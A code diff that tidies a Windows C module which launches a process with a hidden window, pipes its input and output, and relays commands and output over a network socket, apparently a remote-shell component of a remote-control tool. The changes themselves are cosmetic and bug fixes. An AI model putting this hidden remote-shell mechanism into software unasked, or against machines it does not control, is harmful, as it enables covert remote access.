@@ -1,5 +1,4 @@
 #include <windows.h>
-
 #include "iodirect.h"
 
 /*!
@@ -10,24 +9,26 @@
  * @return:		Handle of process, or null for failed
  */
 
-static HANDLE RedirectStreamOpen(LPSTR command,PHANDLE in,PHANDLE out,DWORD*pPid) 
+static HANDLE RedirectStreamOpen(LPSTR command,PHANDLE in,PHANDLE out,DWORD*pPid)
 {
-	if(command==NULL | in == NULL | out == NULL | pPid == NULL)return 0; 
-
-	SECURITY_ATTRIBUTES SecurityAttributes;
+    SECURITY_ATTRIBUTES SecurityAttributes;
 	HANDLE ShellStdinPipe = NULL;
 	HANDLE ShellStdoutPipe = NULL;
 	HANDLE hRead = NULL;
 	HANDLE hWrite = NULL;
 
+    PROCESS_INFORMATION ProcessInformation;
+	STARTUPINFO si;
+	HANDLE ProcessHandle = NULL;
+	if(command==NULL || in == NULL || out == NULL || pPid == NULL)return 0;
 
 	SecurityAttributes.nLength = sizeof(SecurityAttributes);
-	SecurityAttributes.lpSecurityDescriptor = NULL; 
-	SecurityAttributes.bInheritHandle = TRUE; 
+	SecurityAttributes.lpSecurityDescriptor = NULL;
+	SecurityAttributes.bInheritHandle = TRUE;
 
 	if ( !CreatePipe(&hRead, &ShellStdoutPipe,&SecurityAttributes, 0) ) return NULL;
 
-	if ( !CreatePipe(&ShellStdinPipe, &hWrite,&SecurityAttributes, 0) ) 
+	if ( !CreatePipe(&ShellStdinPipe, &hWrite,&SecurityAttributes, 0) )
 	{
 		CloseHandle (hRead);
 		return NULL;
@@ -36,20 +37,13 @@ static HANDLE RedirectStreamOpen(LPSTR command,PHANDLE in,PHANDLE out,DWORD*pPid
 
 	////////////////////////////////
 
-
-	PROCESS_INFORMATION ProcessInformation;
-	STARTUPINFO si;
-	HANDLE ProcessHandle = NULL;
-
-
-
 	ZeroMemory(&si,sizeof(si));
 	si.cb = sizeof(STARTUPINFO);
-	si.wShowWindow = SW_HIDE; 
-	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
+	si.wShowWindow = SW_HIDE;
+	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 
-	si.hStdInput  = ShellStdinPipe; 
-	si.hStdOutput = ShellStdoutPipe; 
+	si.hStdInput  = ShellStdinPipe;
+	si.hStdOutput = ShellStdoutPipe;
 
 	DuplicateHandle(GetCurrentProcess(), ShellStdoutPipe,
 			GetCurrentProcess(), &si.hStdError,
@@ -137,14 +131,15 @@ COMMAND_HANDLER_FUNC(ioredirect)
 	socket_send(s,COMMAND_RETURN_TRUE,1,0);
 
 	//Send Handle and socket to thread
-	int tmp[3];
-	tmp[0] = *(int*)&out;
-	tmp[1] = *(int*)&s;
-	tmp[2] = *(int*)&proc;
-
-	//Create read echo thread
-	CloseHandle(CreateThread(NULL,0,ReadEchoToSocket,tmp,0,NULL));
-	Sleep(IODIRECT_TIMEWAIT);
+	{
+        int tmp[3];
+        tmp[0] = *(int*)&out;
+        tmp[1] = *(int*)&s;
+        tmp[2] = *(int*)&proc;
+        //Create read echo thread
+        CloseHandle(CreateThread(NULL,0,ReadEchoToSocket,tmp,0,NULL));
+        Sleep(IODIRECT_TIMEWAIT);
+	}
 
 	//Get remote command
 	while(nread = socket_recv(s,read_buf,IODIRECT_READBUF,0),nread>0)
